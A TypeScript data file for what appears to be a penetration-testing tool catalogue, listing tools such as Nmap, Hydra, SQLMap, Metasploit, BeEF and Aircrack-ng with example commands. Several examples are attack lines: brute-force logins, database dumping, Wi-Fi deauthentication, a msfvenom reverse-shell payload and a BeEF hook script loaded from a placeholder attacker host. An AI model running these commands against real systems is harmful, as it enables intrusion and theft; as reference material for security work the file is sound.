
export interface Tool {
  id: string;
  name: string;
  description: string;
  category: string;
  categoryId: string;
  usage?: string;
  installation?: string;
  examples?: { title: string; code: string }[];
  documentation?: string;
  githubUrl?: string;
  tags?: string[];
  additionalInfo?: string;
}

export interface ToolCategory {
  id: string;
  name: string;
  description: string;
  tools: Tool[];
}

// Comprehensive data based on the GitHub repository structure
export const toolsCategories: ToolCategory[] = [
  {
    id: "information-gathering",
    name: "Information Gathering",
    description: "Tools for collecting data about target systems and networks to identify potential attack vectors",
    tools: [
      {
        id: "nmap",
        name: "Nmap",
        description: "Network Mapper is a free and open-source utility for network discovery and security auditing",
        category: "Information Gathering",
        categoryId: "information-gathering",
        installation: "sudo apt install nmap",
        usage: "Nmap is used to discover hosts and services on a computer network by sending packets and analyzing the responses. It can identify open ports, detect operating systems, and scan for vulnerabilities.",
        examples: [
          {
            title: "Basic scan of a target",
            code: "nmap 192.168.1.1"
          },
          {
            title: "Scan specific ports",
            code: "nmap -p 80,443 192.168.1.1"
          },
          {
            title: "Aggressive scan",
            code: "nmap -A 192.168.1.1"
          },
          {
            title: "OS detection",
            code: "nmap -O 192.168.1.1"
          },
          {
            title: "Service version detection",
            code: "nmap -sV 192.168.1.1"
          },
          {
            title: "Script scan",
            code: "nmap --script=vuln 192.168.1.1"
          }
        ],
        documentation: "Nmap provides a powerful set of features for network exploration and security auditing. It can determine host availability, operating systems, types of packet filters/firewalls, open ports, and more. Nmap uses raw IP packets in novel ways to determine what hosts are available on the network, what services those hosts are offering, what operating systems they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics.",
        githubUrl: "https://github.com/nmap/nmap",
        tags: ["network", "scanner", "reconnaissance", "port scanner"],
        additionalInfo: "Nmap was originally written by Gordon Lyon (also known as Fyodor Vaskovich) and is now maintained by a community of developers. It's available for most operating systems including Windows, macOS, and Linux distributions."
      },
      {
        id: "maltego",
        name: "Maltego",
        description: "Open source intelligence and forensics application, used for gathering and connecting information for visual link analysis",
        category: "Information Gathering",
        categoryId: "information-gathering",
        usage: "Maltego is used for open-source intelligence and forensics to determine the relationships and connections between people, groups, websites, domains, and more. It presents information as nodes on a graph for easy visualization of complex networks.",
        installation: "sudo apt install maltego",
        examples: [
          {
            title: "Launch Maltego",
            code: "maltego"
          }
        ],
        documentation: "Maltego is a visual link analysis tool that is used for gathering and connecting information for investigative tasks. It allows you to mine data from various public sources and visualize this information in a graph format, showing the connections between pieces of information from different sources.",
        githubUrl: "https://github.com/paterva/maltego-trx",
        tags: ["OSINT", "visualization", "reconnaissance", "forensics"],
        additionalInfo: "Maltego is developed by Paterva and is available in both free Community Edition and commercial versions. It's widely used by security researchers, private investigators, and law enforcement agencies."
      },
      {
        id: "the-harvester",
        name: "TheHarvester",
        description: "Tool for gathering e-mail accounts, subdomain names, virtual hosts, open ports, and banners from different public sources",
        category: "Information Gathering",
        categoryId: "information-gathering",
        installation: "sudo apt install theharvester",
        usage: "TheHarvester is used to gather open source intelligence (OSINT) on a company or domain by extracting information from various public sources",
        examples: [
          {
            title: "Basic scan of a domain",
            code: "theharvester -d example.com -l 100 -b all"
          },
          {
            title: "Search using specific data source",
            code: "theharvester -d example.com -b linkedin"
          },
          {
            title: "Save results to XML file",
            code: "theharvester -d example.com -b all -f results.xml"
          }
        ],
        documentation: "TheHarvester is designed to help security professionals during the early stages of a penetration test to gather email addresses, subdomains, hosts, employee names, open ports, and banners from different public sources like search engines, PGP key servers, and SHODAN.",
        githubUrl: "https://github.com/laramies/theHarvester",
        tags: ["OSINT", "email", "subdomain", "reconnaissance"]
      },
      {
        id: "recon-ng",
        name: "Recon-ng",
        description: "Full-featured reconnaissance framework designed with a modular approach for web-based open source reconnaissance",
        category: "Information Gathering",
        categoryId: "information-gathering",
        installation: "sudo apt install recon-ng",
        usage: "Recon-ng provides a powerful environment to conduct open source web-based reconnaissance quickly and thoroughly",
        examples: [
          {
            title: "Start Recon-ng",
            code: "recon-ng"
          },
          {
            title: "Add domain to workspace",
            code: "recon-ng\nworkspaces add example\ndb insert domains example.com"
          },
          {
            title: "Run module",
            code: "recon-ng\nmodules load recon/domains-hosts/google_site_web\nrun"
          }
        ],
        documentation: "Recon-ng is a full-featured reconnaissance framework designed with a modular approach and streamlined workflow in mind. Recon-ng has a look and feel similar to the Metasploit Framework, reducing the learning curve for leveraging the framework.",
        githubUrl: "https://github.com/lanmaster53/recon-ng",
        tags: ["reconnaissance", "OSINT", "framework", "modular"]
      }
    ]
  },
  {
    id: "vulnerability-analysis",
    name: "Vulnerability Analysis",
    description: "Tools for identifying and analyzing security vulnerabilities in networks and applications",
    tools: [
      {
        id: "nikto",
        name: "Nikto",
        description: "Web server scanner which performs comprehensive tests against web servers for multiple items",
        category: "Vulnerability Analysis",
        categoryId: "vulnerability-analysis",
        installation: "sudo apt install nikto",
        usage: "Nikto is used to scan web servers for known vulnerabilities and misconfigurations. It checks for over 6700 potentially dangerous files/CGIs, outdated server versions, and specific problems on servers.",
        examples: [
          {
            title: "Basic scan",
            code: "nikto -h http://example.com"
          },
          {
            title: "Full scan with SSL",
            code: "nikto -h https://example.com -ssl"
          },
          {
            title: "Scan specific port",
            code: "nikto -h example.com -p 8080"
          },
          {
            title: "Save output to file",
            code: "nikto -h example.com -o report.html -Format html"
          }
        ],
        documentation: "Nikto is an open source web server scanner that performs comprehensive tests against web servers for multiple items, including over 6700 potentially dangerous files/CGIs, checks for outdated versions of over 1250 servers, and version specific problems on over 270 servers.",
        githubUrl: "https://github.com/sullo/nikto",
        tags: ["web", "scanner", "vulnerability", "webserver"],
        additionalInfo: "Nikto was originally written by Chris Sullo and is now maintained by a community of developers. It's included by default in many penetration testing Linux distributions like Kali Linux."
      },
      {
        id: "openvas",
        name: "OpenVAS",
        description: "Open Vulnerability Assessment Scanner is a framework of tools for vulnerability scanning and management",
        category: "Vulnerability Analysis",
        categoryId: "vulnerability-analysis",
        installation: "sudo apt install openvas",
        usage: "OpenVAS is used for network vulnerability scanning and management. It can identify security issues in systems and applications across networks.",
        examples: [
          {
            title: "Start OpenVAS",
            code: "sudo gvm-start"
          },
          {
            title: "Access web interface",
            code: "firefox https://localhost:9392"
          },
          {
            title: "Create a new task",
            code: "gvm-cli --gmp-username admin --gmp-password admin socket --xml \"<create_task><name>Scan</name><target id='target_id'/></create_task>\""
          }
        ],
        documentation: "OpenVAS (Open Vulnerability Assessment System) is a comprehensive vulnerability scanning and management solution. It consists of several services and tools that work together to perform scans, analyze vulnerabilities, and present results in a structured format.",
        tags: ["vulnerability", "scanner", "management", "network"],
        additionalInfo: "OpenVAS is part of the Greenbone Vulnerability Management (GVM) solution. It includes a regularly updated feed of vulnerability tests and can be integrated with other security tools."
      },
      {
        id: "wapiti",
        name: "Wapiti",
        description: "Web application vulnerability scanner that audits the security of web applications",
        category: "Vulnerability Analysis",
        categoryId: "vulnerability-analysis",
        installation: "sudo apt install wapiti",
        usage: "Wapiti scans web applications by identifying script injection points and injecting payloads to detect vulnerabilities",
        examples: [
          {
            title: "Basic scan",
            code: "wapiti -u http://example.com/"
          },
          {
            title: "Specific module scan",
            code: "wapiti -u http://example.com/ -m sql,xss"
          },
          {
            title: "Generate HTML report",
            code: "wapiti -u http://example.com/ -f html -o report"
          }
        ],
        documentation: "Wapiti allows you to audit the security of your web applications. It performs black-box scans to find vulnerabilities such as SQL injections, XSS, CRLF injections, command execution, XXE injections, and more.",
        githubUrl: "https://github.com/wapiti-scanner/wapiti",
        tags: ["web", "scanner", "injection", "audit"]
      }
    ]
  },
  {
    id: "web-application-analysis",
    name: "Web Application Analysis",
    description: "Tools for analyzing and exploiting web applications to identify security issues",
    tools: [
      {
        id: "burpsuite",
        name: "Burp Suite",
        description: "An integrated platform for performing security testing of web applications",
        category: "Web Application Analysis",
        categoryId: "web-application-analysis",
        installation: "Download from PortSwigger website",
        usage: "Burp Suite is used as a proxy for intercepting and modifying HTTP/S traffic between a browser and web servers. It provides a comprehensive suite of tools for web application penetration testing.",
        examples: [
          {
            title: "Start Burp Suite",
            code: "burpsuite"
          },
          {
            title: "Configure browser proxy",
            code: "Settings > Network > Manual proxy configuration > HTTP Proxy: 127.0.0.1, Port: 8080"
          },
          {
            title: "Basic intercept",
            code: "Proxy > Intercept > Intercept is on"
          },
          {
            title: "Send to repeater",
            code: "Right click on request > Send to Repeater"
          }
        ],
        documentation: "Burp Suite is an integrated platform for performing security testing of web applications. Its various tools work seamlessly together to support the entire testing process, from initial mapping and analysis of an application's attack surface, through to finding and exploiting security vulnerabilities.",
        githubUrl: "https://portswigger.net/burp",
        tags: ["web", "proxy", "interception", "testing", "scanner"],
        additionalInfo: "Burp Suite is available in Community (free) and Professional (paid) editions. The Professional edition includes additional features such as a scanner, collaborator, and project saving capabilities."
      },
      {
        id: "sqlmap",
        name: "SQLMap",
        description: "Automatic SQL injection and database takeover tool",
        category: "Web Application Analysis",
        categoryId: "web-application-analysis",
        installation: "sudo apt install sqlmap",
        usage: "SQLMap is used to detect and exploit SQL injection flaws in web applications. It automates the process of detecting and exploiting SQL injection vulnerabilities and taking over database servers.",
        examples: [
          {
            title: "Basic URL scan",
            code: "sqlmap -u \"http://example.com/page.php?id=1\""
          },
          {
            title: "Dump database",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" --dump"
          },
          {
            title: "Get database banner",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" --banner"
          },
          {
            title: "List databases",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" --dbs"
          },
          {
            title: "Specify database to enumerate",
            code: "sqlmap -u \"http://example.com/page.php?id=1\" -D database_name --tables"
          }
        ],
        documentation: "SQLMap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester, and a broad range of switches for database fingerprinting, data fetching from the database, accessing the underlying file system, and executing commands on the operating system.",
        githubUrl: "https://github.com/sqlmapproject/sqlmap",
        tags: ["sql injection", "exploitation", "database", "automation"],
        additionalInfo: "SQLMap supports a wide range of database management systems including MySQL, Oracle, PostgreSQL, Microsoft SQL Server, and many others. It can work with different injection techniques and bypass various protection mechanisms."
      },
      {
        id: "owasp-zap",
        name: "OWASP ZAP",
        description: "Open Web Application Security Project Zed Attack Proxy is a free security tool for finding vulnerabilities in web applications",
        category: "Web Application Analysis",
        categoryId: "web-application-analysis",
        installation: "sudo apt install zaproxy",
        usage: "OWASP ZAP is used as both an automated scanner and manual testing tool for web application security assessments",
        examples: [
          {
            title: "Start ZAP",
            code: "zaproxy"
          },
          {
            title: "Quick scan from command line",
            code: "zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true' http://example.com"
          },
          {
            title: "Generate HTML report",
            code: "zap-cli report -o report.html -f html"
          }
        ],
        documentation: "OWASP ZAP (Zed Attack Proxy) is a free, open-source penetration testing tool being maintained under the Open Web Application Security Project (OWASP). ZAP is designed specifically for testing web applications and is both flexible and extensible.",
        githubUrl: "https://github.com/zaproxy/zaproxy",
        tags: ["web", "proxy", "scanner", "OWASP", "penetration testing"]
      }
    ]
  },
  {
    id: "password-attacks",
    name: "Password Attacks",
    description: "Tools for attacking password-based authentication systems to identify weak credentials",
    tools: [
      {
        id: "hydra",
        name: "Hydra",
        description: "Fast and flexible online password cracking tool",
        category: "Password Attacks",
        categoryId: "password-attacks",
        installation: "sudo apt install hydra",
        usage: "Hydra is used to brute force credentials for various network services. It supports numerous protocols including FTP, HTTP, HTTPS, SMB, SSH, and many more.",
        examples: [
          {
            title: "SSH brute force",
            code: "hydra -l user -P passwordlist.txt ssh://192.168.1.1"
          },
          {
            title: "HTTP form brute force",
            code: "hydra -l admin -P passwordlist.txt 192.168.1.1 http-post-form \"/login:username=^USER^&password=^PASS^:F=Login failed\""
          },
          {
            title: "FTP brute force with verbose output",
            code: "hydra -l user -P passwordlist.txt ftp://192.168.1.1 -v"
          },
          {
            title: "Multiple services scan",
            code: "hydra -L users.txt -P passwords.txt 192.168.1.1 ssh ftp mysql"
          }
        ],
        documentation: "Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add. This tool makes it possible for researchers and security consultants to show how easy it would be to gain unauthorized access to a system.",
        githubUrl: "https://github.com/vanhauser-thc/thc-hydra",
        tags: ["brute force", "password", "authentication", "cracking", "login"],
        additionalInfo: "THC-Hydra is maintained by van Hauser and was developed as part of THC (The Hackers Choice) group's tools. It's considered one of the fastest network login crackers with support for more than 50 protocols and services."
      },
      {
        id: "john",
        name: "John the Ripper",
        description: "Password security auditing and password recovery tool",
        category: "Password Attacks",
        categoryId: "password-attacks",
        installation: "sudo apt install john",
        usage: "John the Ripper is used to crack password hashes and perform password auditing. It combines several cracking modes and is highly customizable with external cracking rules.",
        examples: [
          {
            title: "Crack Unix password file",
            code: "john --format=raw-md5 hashes.txt"
          },
          {
            title: "Show cracked passwords",
            code: "john --show hashes.txt"
          },
          {
            title: "Use wordlist mode",
            code: "john --wordlist=wordlist.txt --rules hashes.txt"
          },
          {
            title: "Benchmark hash types",
            code: "john --test --format=all"
          },
          {
            title: "Incremental mode",
            code: "john --incremental hashes.txt"
          }
        ],
        documentation: "John the Ripper is a fast password cracker, designed for both password cracking and password security auditing. It supports various hash types including traditional Unix crypt(3) password hashes, macOS password hashes, Windows LM hashes, and many more. It combines several cracking modes in one program and is fully configurable for your particular needs.",
        githubUrl: "https://github.com/openwall/john",
        tags: ["password cracking", "hash", "audit", "security testing"],
        additionalInfo: "John the Ripper was initially developed by Solar Designer and is now maintained by the Openwall Project. There are multiple versions available, including the core version and the community-enhanced 'jumbo' version with additional features."
      },
      {
        id: "hashcat",
        name: "Hashcat",
        description: "Advanced GPU-accelerated password recovery utility",
        category: "Password Attacks",
        categoryId: "password-attacks",
        installation: "sudo apt install hashcat",
        usage: "Hashcat is used for high-speed password cracking with GPU acceleration",
        examples: [
          {
            title: "Basic MD5 cracking",
            code: "hashcat -m 0 -a 0 hashes.txt wordlist.txt"
          },
          {
            title: "Brute force attack",
            code: "hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a"
          },
          {
            title: "Rule-based attack",
            code: "hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/best64.rule"
          }
        ],
        documentation: "Hashcat is the world's fastest and most advanced password recovery utility, supporting five unique attack modes for over 300 highly-optimized hashing algorithms. It features both CPU and GPU acceleration, multi-hash and multi-OS support.",
        githubUrl: "https://github.com/hashcat/hashcat",
        tags: ["password", "hash", "cracking", "GPU", "acceleration"]
      }
    ]
  },
  {
    id: "exploitation-tools",
    name: "Exploitation Tools",
    description: "Tools for exploiting vulnerabilities and gaining access to systems",
    tools: [
      {
        id: "metasploit",
        name: "Metasploit Framework",
        description: "Advanced open-source platform for developing, testing, and executing exploits",
        category: "Exploitation Tools",
        categoryId: "exploitation-tools",
        installation: "sudo apt install metasploit-framework",
        usage: "Metasploit is used for penetration testing, exploit development, and vulnerability research. It provides a comprehensive platform for finding, exploiting, and validating vulnerabilities.",
        examples: [
          {
            title: "Start Metasploit console",
            code: "msfconsole"
          },
          {
            title: "Search for exploit",
            code: "search apache"
          },
          {
            title: "Use exploit module",
            code: "use exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST 192.168.1.100\nset LPORT 4444\nexploit"
          },
          {
            title: "Database setup",
            code: "msfdb init\ndb_status"
          },
          {
            title: "Generate payload",
            code: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe"
          }
        ],
        documentation: "The Metasploit Framework is a comprehensive platform for developing, testing, and using exploit code. It contains a suite of tools that you can use to test security vulnerabilities, enumerate networks, execute attacks, and evade detection. At its core is the Metasploit Framework, a platform for writing, testing, and using exploit code. The Framework is a massive Ruby library designed specifically with exploit development in mind.",
        githubUrl: "https://github.com/rapid7/metasploit-framework",
        tags: ["exploitation", "penetration testing", "framework", "vulnerability", "payload"],
        additionalInfo: "Metasploit was originally created by H. D. Moore in 2003 and is now owned by Rapid7. It's available in both commercial (Metasploit Pro) and free (Metasploit Framework) versions. The framework is built into most penetration testing distributions and is considered a standard tool for security professionals."
      },
      {
        id: "beef",
        name: "BeEF (Browser Exploitation Framework)",
        description: "Tool focusing on leveraging browser vulnerabilities to assess the security posture of a target",
        category: "Exploitation Tools",
        categoryId: "exploitation-tools",
        installation: "sudo apt install beef-xss",
        usage: "BeEF is used to assess a target's security by focusing on the web browser attack vector",
        examples: [
          {
            title: "Start BeEF",
            code: "sudo beef-xss"
          },
          {
            title: "Hook browser with JavaScript",
            code: "<script src=\"http://attacker-ip:3000/hook.js\"></script>"
          },
          {
            title: "Access control panel",
            code: "http://127.0.0.1:3000/ui/panel"
          }
        ],
        documentation: "BeEF (Browser Exploitation Framework) is a penetration testing tool focusing on web browsers. It allows the penetration tester to assess the actual security posture of a target environment by using client-side attack vectors.",
        githubUrl: "https://github.com/beefproject/beef",
        tags: ["browser", "exploitation", "XSS", "client-side", "hook"]
      }
    ]
  },
  {
    id: "wireless-attacks",
    name: "Wireless Attacks",
    description: "Tools for analyzing and attacking wireless networks and protocols",
    tools: [
      {
        id: "aircrack-ng",
        name: "Aircrack-ng",
        description: "Complete suite of tools to assess WiFi network security",
        category: "Wireless Attacks",
        categoryId: "wireless-attacks",
        installation: "sudo apt install aircrack-ng",
        usage: "Aircrack-ng is used to monitor, attack, test, and crack WiFi networks. It includes tools for packet capture, WEP/WPA key cracking, and analysis.",
        examples: [
          {
            title: "Enable monitor mode",
            code: "airmon-ng start wlan0"
          },
          {
            title: "Capture packets",
            code: "airodump-ng wlan0mon"
          },
          {
            title: "Targeted capture",
            code: "airodump-ng -c 1 --bssid 00:11:22:33:44:55 -w capture wlan0mon"
          },
          {
            title: "Deauthentication attack",
            code: "aireplay-ng -0 10 -a 00:11:22:33:44:55 wlan0mon"
          },
          {
            title: "Crack WPA handshake",
            code: "aircrack-ng -w wordlist.txt capture-01.cap"
          }
        ],
        documentation: "Aircrack-ng is a network software suite consisting of a detector, packet sniffer, WEP and WPA/WPA2-PSK cracker and analysis tool for 802.11 wireless LANs. It works with any wireless network interface controller whose driver supports raw monitoring mode and can sniff 802.11a, 802.11b and 802.11g traffic.",
        githubUrl: "https://github.com/aircrack-ng/aircrack-ng",
        tags: ["wireless", "WiFi", "WEP", "WPA", "cracking", "monitoring"]
      },
      {
        id: "wifite",
        name: "Wifite",
        description: "Automated wireless attack tool designed to simplify wireless penetration testing",
        category: "Wireless Attacks",
        categoryId: "wireless-attacks",
        installation: "sudo apt install wifite",
        usage: "Wifite is used to automate wireless network attacks, making it easier to audit networks",
        examples: [
          {
            title: "Basic scan and attack",
            code: "sudo wifite"
          },
          {
            title: "Target specific encryption",
            code: "sudo wifite --wpa"
          },
          {
            title: "Specify a wordlist",
            code: "sudo wifite --dict /path/to/wordlist.txt"
          }
        ],
        documentation: "Wifite is designed to attack multiple WEP, WPA, and WPS encrypted networks in a row, making it a great tool for penetration testers who want to test the security of several networks quickly. It automates the wireless attack process and can be more user-friendly for beginners than using the aircrack-ng suite directly.",
        githubUrl: "https://github.com/derv82/wifite2",
        tags: ["wireless", "automation", "WPA", "WEP", "WPS"]
      }
    ]
  },
  {
    id: "forensics-tools",
    name: "Forensics Tools",
    description: "Tools for digital forensics and evidence collection",
    tools: [
      {
        id: "autopsy",
        name: "Autopsy",
        description: "Digital forensics platform for analyzing disk images and recovering files",
        category: "Forensics Tools",
        categoryId: "forensics-tools",
        installation: "sudo apt install autopsy",
        usage: "Autopsy is used for digital forensics investigations to recover and analyze evidence from disk images",
        examples: [
          {
            title: "Start Autopsy",
            code: "sudo autopsy"
          },
          {
            title: "Access web interface",
            code: "Open browser and navigate to http://localhost:9999/autopsy"
          }
        ],
        documentation: "Autopsy is a digital forensics platform that provides a graphical interface to The Sleuth Kit and other digital forensics tools. It can be used by law enforcement, military, and corporate examiners to investigate what happened on a computer. It features timeline analysis, hash filtering, file system analysis, keyword searching, and more.",
        githubUrl: "https://github.com/sleuthkit/autopsy",
        tags: ["forensics", "disk image", "analysis", "evidence", "recovery"]
      },
      {
        id: "volatility",
        name: "Volatility",
        description: "Memory forensics framework for incident response and malware analysis",
        category: "Forensics Tools",
        categoryId: "forensics-tools",
        installation: "sudo apt install volatility",
        usage: "Volatility is used to extract digital artifacts from volatile memory (RAM) samples",
        examples: [
          {
            title: "Identify memory profile",
            code: "volatility -f memory.dmp imageinfo"
          },
          {
            title: "List running processes",
            code: "volatility -f memory.dmp --profile=Win10x64_19041 pslist"
          },
          {
            title: "Show network connections",
            code: "volatility -f memory.dmp --profile=Win10x64_19041 netscan"
          }
        ],
        documentation: "Volatility is an advanced memory forensics framework that helps extract digital artifacts from volatile memory (RAM) samples. It is used for incident response, malware analysis, and general forensics investigations. The framework is written in Python and supports analysis of Windows, Linux, and macOS memory dumps.",
        githubUrl: "https://github.com/volatilityfoundation/volatility",
        tags: ["memory forensics", "RAM", "malware analysis", "incident response"]
      }
    ]
  },
  {
    id: "reverse-engineering",
    name: "Reverse Engineering",
    description: "Tools for analyzing compiled software and understanding its structure",
    tools: [
      {
        id: "ghidra",
        name: "Ghidra",
        description: "Software reverse engineering framework developed by NSA",
        category: "Reverse Engineering",
        categoryId: "reverse-engineering",
        installation: "Download from ghidra-sre.org",
        usage: "Ghidra is used to analyze compiled code and understand its functionality through decompilation",
        examples: [
          {
            title: "Start Ghidra",
            code: "ghidraRun"
          },
          {
            title: "Create new project",
            code: "File > New Project"
          },
          {
            title: "Import binary",
            code: "File > Import File"
          }
        ],
        documentation: "Ghidra is a software reverse engineering (SRE) framework created and maintained by the National Security Agency. It includes a suite of full-featured, high-end software analysis tools that enable users to analyze compiled code on a variety of platforms including Windows, macOS, and Linux.",
        githubUrl: "https://github.com/NationalSecurityAgency/ghidra",
        tags: ["reverse engineering", "decompiler", "disassembler", "analysis"]
      },
      {
        id: "radare2",
        name: "Radare2",
        description: "Complete framework for reverse-engineering and analyzing binaries",
        category: "Reverse Engineering",
        categoryId: "reverse-engineering",
        installation: "sudo apt install radare2",
        usage: "Radare2 is used for disassembling, debugging, and analyzing binary files",
        examples: [
          {
            title: "Open binary",
            code: "r2 binary.exe"
          },
          {
            title: "Analyze all",
            code: "r2 binary.exe\n[0x00000000]> aaa"
          },
          {
            title: "Show functions",
            code: "r2 binary.exe\n[0x00000000]> afl"
          }
        ],
        documentation: "Radare2 is a complete framework for reverse-engineering and analyzing binaries. It's composed of a set of small utilities that can be used together or independently from the command line. It provides advanced features like binary diffing, binary patching, and scripted reverse engineering.",
        githubUrl: "https://github.com/radareorg/radare2",
        tags: ["reverse engineering", "disassembler", "debugger", "hexadecimal editor", "binary analysis"]
      }
    ]
  }
];

// Helper function to get all tools as a flat array
export const getAllTools = (): Tool[] => {
  return toolsCategories.flatMap(category => category.tools);
};

// Helper function to get a tool by ID
export const getToolById = (id: string): Tool | undefined => {
  return getAllTools().find(tool => tool.id === id);
};

// Helper function to get tools by category
export const getToolsByCategory = (categoryId: string): Tool[] => {
  const category = toolsCategories.find(cat => cat.id === categoryId);
  return category ? category.tools : [];
};

// Helper function to get a category by ID
export const getCategoryById = (id: string): ToolCategory | undefined => {
  return toolsCategories.find(category => category.id === id);
};

// Helper function to search tools
export const searchTools = (query: string): Tool[] => {
  if (!query.trim()) return [];
  
  const lowerQuery = query.toLowerCase().trim();
  
  return getAllTools().filter(tool => 
    tool.name.toLowerCase().includes(lowerQuery) ||
    tool.description.toLowerCase().includes(lowerQuery) ||
    (tool.tags && tool.tags.some(tag => tag.toLowerCase().includes(lowerQuery))) ||
    (tool.documentation && tool.documentation.toLowerCase().includes(lowerQuery))
  );
};
